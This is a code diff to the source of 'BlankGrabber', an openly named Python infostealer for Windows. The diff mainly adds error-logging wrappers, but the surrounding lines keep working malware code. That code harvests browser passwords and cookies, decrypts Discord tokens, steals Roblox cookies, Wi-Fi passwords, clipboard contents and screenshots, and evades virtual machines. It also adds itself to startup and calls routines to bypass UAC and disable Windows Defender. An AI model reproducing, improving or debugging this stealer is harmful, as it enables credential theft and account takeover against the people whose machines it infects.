@@ -20,18 +20,29 @@ import re
 from requests import *
 import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
 from win32crypt import CryptUnprotectData
+import traceback
 
 if os.path.isfile(configfile := os.path.join(sys._MEIPASS, "config.json")):
     with open(configfile, encoding= "utf-8", errors= "ignore") as file:
         _config = json.load(file)
 else:
     _config = {}
+_errorlogs = []
 
 PINGME = _config.get("PINGME", True) # Pings @everyone
 VMPROTECT = _config.get("VMPROTECT", True) # Protect your grabber from VMs
 BSOD = _config.get("BSOD", True) # Tries to trigger Blue Screen if grabber force exit
 STARTUP = _config.get("STARTUP", True) # Puts the grabber in startup
 HIDE_ITSELF = _config.get("HIDE_ITSELF", True) # Hides the Grabber
+
+def catch(func):
+    def newfunc(*args, **kwargs):
+        try:
+            return func(*args, **kwargs)
+        except Exception as e:
+            trb = traceback.extract_tb(sys.exc_info()[2])[-1]
+            _errorlogs.append(f"Line {trb[1]} : {trb[2]} : {e.__class__.__name__} : {e}")
+    return newfunc
 
 def fquit():
     if BSOD:
@@ -58,6 +69,7 @@ def generate(num=5, invisible= False):
         return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
     else:
         return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))
+
 
 def force_decode(b: bytes):
     return b.decode(json.detect_encoding(b))
@@ -106,11 +118,9 @@ class vmprotect:
 
         if os.path.isfile(os.path.join("D:" + os.sep, "TOOLS", "Detonate.exe")):
             fquit()
-        try:
-            if http.request("GET", "http://ip-api.com/line/?fields=hosting").data.decode() == "true":
+
+        if http.request("GET", "http://ip-api.com/line/?fields=hosting").data.decode() == "true":
                 fquit()
-        except Exception:
-            pass
 
 class BlankGrabber:
     def __init__(self):
@@ -172,13 +182,15 @@ class BlankGrabber:
 
         for t in threads:
             t.join()
-        if os.path.isfile(os.path.join(self.tempfolder, "Logs.txt")):
-            with open(os.path.join(self.tempfolder, "Logs.txt"), "r+") as e:
-                log = e.read()
-                e.seek(0)
-                e.write("These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+log.strip())
+        self.errorReport()
         self.send()
+    
+    def errorReport(self):
+        if len(_errorlogs):
+            with open(os.path.join(self.tempfolder, "Error Logs.txt"), "w") as file:
+                file.write("\n".join(_errorlogs))
 
+    @catch
     def webshot(self):
         def is_monochrome(path):
             return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
@@ -202,20 +214,15 @@ class BlankGrabber:
         if len(key.split("-")) == 5:
             self.productKey = key
 
+    @catch
     def copy(self, source, destination):
         try:
             shutil.copy(source, destination)
         except Exception:
-            try:
-                os.makedirs(os.path.dirname(destination), exist_ok= True)
-                shutil.copy(source, destination)
-            except Exception as e:
-                self.logs(e, sys.exc_info())
+            os.makedirs(os.path.dirname(destination), exist_ok= True)
+            shutil.copy(source, destination)
 
-    def logs(self, e, exc_info):
-        with open(os.path.join(self.tempfolder, "Logs.txt"), "a", errors= "ignore") as file:
-            file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
-
+    @catch
     def getWifiPasswords(self):
         profiles = []
         passwords = {}
@@ -240,6 +247,7 @@ class BlankGrabber:
             with open(os.path.join(self.system, "Wifi Networks.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("\n----------------------------------------------------\n".join(profiles))
 
+    @catch
     def getpass(self):
         subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
         subprocess.run(f"pm.bam /stext \"{os.path.join(os.path.abspath(sys._MEIPASS), 'Passwords.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
@@ -254,6 +262,7 @@ class BlankGrabber:
             with open(os.path.join(directory, "Browser Passwords.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("\n\n".join(self.passwords))
 
+    @catch
     def getcookie(self):
         subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
         subprocess.run(f"ck.bam /stext \"{os.path.join(os.path.abspath(sys._MEIPASS), 'Cookies.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
@@ -268,6 +277,7 @@ class BlankGrabber:
             with open(os.path.join(directory, "Browser Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("\n\n".join(self.cookies))
 
+    @catch
     def minecraft_stealer(self):
         if not os.path.exists(mcdir := os.path.join(self.roaming, ".minecraft")):
             return
@@ -277,6 +287,7 @@ class BlankGrabber:
             os.makedirs(grabpath := os.path.join(self.tempfolder, "Gaming", "Minecraft"), exist_ok= True)
             self.copy(os.path.join(mcdir, i), os.path.join(grabpath, i))
 
+    @catch
     def roblox_stealer(self):
         def check(cookie):
             headers = {"Cookie" : ".ROBLOSECURITY=" + cookie}
@@ -295,20 +306,18 @@ class BlankGrabber:
         for i in temp:
             for j in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", i):
                 check(j)
-
         if len(self.roblocookies):
             os.makedirs(rbdir := os.path.join(self.tempfolder, "Gaming", "Roblox"), exist_ok= True)
             with open(os.path.join(rbdir, "Roblox Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write(("\n" + "Blank Grabber".center(50, "=")).join(self.roblocookies))
 
+    @catch
     def crash_bd(self):
         bdasar = os.path.join(self.roaming, "BetterDiscord", "data", "betterdiscord.asar")
         if os.path.isfile(bdasar):
-            try:
-                os.remove(bdasar)
-            except Exception as e:
-                self.logs(e, sys.exc_info())
+            os.remove(bdasar)
 
+    @catch
     def tree(self, path, DName= None):
         if DName is None:
             DName = os.path.basename(path)
@@ -321,35 +330,52 @@ class BlankGrabber:
         return tree.strip()
 
     def misc(self):
-        output = {}
-        for location in ["Desktop", "Documents" , "Downloads", "Music", "Pictures", "Videos"]:
-            output[location] = self.tree(os.path.join(os.getenv("userprofile"), location))
-        for i in output:
-            os.makedirs(os.path.join(self.tempfolder, "Directories"), exist_ok= True)
-            with open(os.path.join(self.tempfolder, "Directories", f"{i}.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
-                file.write(output[i])
+        @catch
+        def directoryTree():
+            output = {}
+            for location in ["Desktop", "Documents" , "Downloads", "Music", "Pictures", "Videos"]:
+                output[location] = self.tree(os.path.join(os.getenv("userprofile"), location))
+            for i in output:
+                os.makedirs(os.path.join(self.tempfolder, "Directories"), exist_ok= True)
+                with open(os.path.join(self.tempfolder, "Directories", f"{i}.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                    file.write(output[i])
 
-        output = force_decode(subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout).strip()
-        if len(output) > 0:
-            with open(os.path.join(self.system, "Clipboard.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+        @catch
+        def clipboard():
+            output = force_decode(subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout).strip()
+            if len(output) > 0:
+                with open(os.path.join(self.system, "Clipboard.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                    file.write(output)
+
+        @catch
+        def getAV():
+            output = subprocess.run(r"WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName", capture_output= True, shell= True)
+            if not output.returncode:
+                output = force_decode(output.stdout).strip().splitlines()
+                if len(output) >= 2:
+                    output = output[2:]
+                    with open(os.path.join(self.system, "Antivirus.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                        file.write("\n".join(output))
+
+        @catch
+        def tasklist():
+            output = force_decode(subprocess.run("tasklist", capture_output= True, shell= True).stdout).strip()
+            with open(os.path.join(self.system, "Task List.txt"), "w", errors= "ignore") as tasklist:
+                tasklist.write(output)
+
+        @catch
+        def sysInfo():
+            output = force_decode(subprocess.run("systeminfo", capture_output= True, shell= True).stdout).strip()
+            with open(os.path.join(self.system, "System Info.txt"), "w", errors= "ignore") as file:
                 file.write(output)
+        
+        directoryTree()
+        clipboard()
+        getAV()
+        tasklist()
+        sysInfo()
 
-        output = subprocess.run(r"WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName", capture_output= True, shell= True)
-        if not output.returncode:
-            output = force_decode(output.stdout).strip().splitlines()
-            if len(output) >= 2:
-                output = output[2:]
-                with open(os.path.join(self.system, "Antivirus.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
-                    file.write("\n".join(output))
-
-        output = force_decode(subprocess.run("tasklist", capture_output= True, shell= True).stdout).strip()
-        with open(os.path.join(self.system, "Task List.txt"), "w", errors= "ignore") as tasklist:
-            tasklist.write(output)
-
-        output = force_decode(subprocess.run("systeminfo", capture_output= True, shell= True).stdout).strip()
-        with open(os.path.join(self.system, "System Info.txt"), "w", errors= "ignore") as file:
-            file.write(output)
-
+    @catch
     def getTokens(self):
         subprocess.run("taskkill /IM discordtokenprotector.exe /F", capture_output= True, shell= True)
         data = []
@@ -379,13 +405,10 @@ class BlankGrabber:
         }
 
         def RickRollDecrypt(path):
+            @catch
             def decrypt_token(encrypted_token, key):
-                try:
-                    return force_decode(pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16])
+                return force_decode(pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16])
 
-                except Exception as e:
-                    self.logs(e, sys.exc_info())
-                    return
             encrypted_tokens = []
             with open(localstatepath, "r", errors= "ignore") as keyfile:
                 try:
@@ -460,10 +483,10 @@ class BlankGrabber:
             with open(os.path.join(discfolder, "Discord Info.txt"), "w", encoding= "utf-8", errors="ignore") as file:
                 file.write("\n\n".join(data))
 
+    @catch
     def screenshot(self):
         image = ImageGrab.grab()
         image.save(os.path.join(self.system, "Screenshot.png"))
-        del image
 
     def headers(self, token=None):
         headers = {
@@ -475,6 +498,7 @@ class BlankGrabber:
 
         return headers
 
+    @catch
     def getip(self):
         try:
             r = json.loads(self.http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
@@ -483,12 +507,12 @@ class BlankGrabber:
             data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()}\nTotal Memory: {int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)} GB" + "\nUUID: " + force_decode(subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout).strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str())+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if len(r["reverse"]) != 0:
                 data += f"\nReverse DNS: {r['reverse']}"
-        except Exception as e:
-            self.logs(e, sys.exc_info())
+        except Exception:
             r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
             data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()}\nTotal Memory: {int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)} GB" + "\nUUID: " + force_decode(subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout).strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str()) + f"\nIP: {r.get('origin')}"
         self.ipinfo = data
 
+    @catch
     def zip(self):
         shutil.make_archive(self.archive.rsplit(".", 1)[0], "zip", self.tempfolder)
 
@@ -528,14 +552,19 @@ if __name__ == "__main__":
         uac_bypass()
     t = threading.Thread(target= disable_wd)
     t.start()
-
+    time.sleep(1)
     while True:
         try:
             r = json.loads(http.request("GET", "https://httpbin.org/get?1=2").data.decode())
             if r.get("args").get("1") != "2":
-                os._exit(0)
+                os._exit(1)
             if VMPROTECT:
-                vmprotect()
+                try:
+                    vmprotect()
+                except UnicodeDecodeError:
+                    pass
+                except Exception:
+                    os._exit(1)
             frozen = hasattr(sys, "frozen")
             if frozen and STARTUP:
                 if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
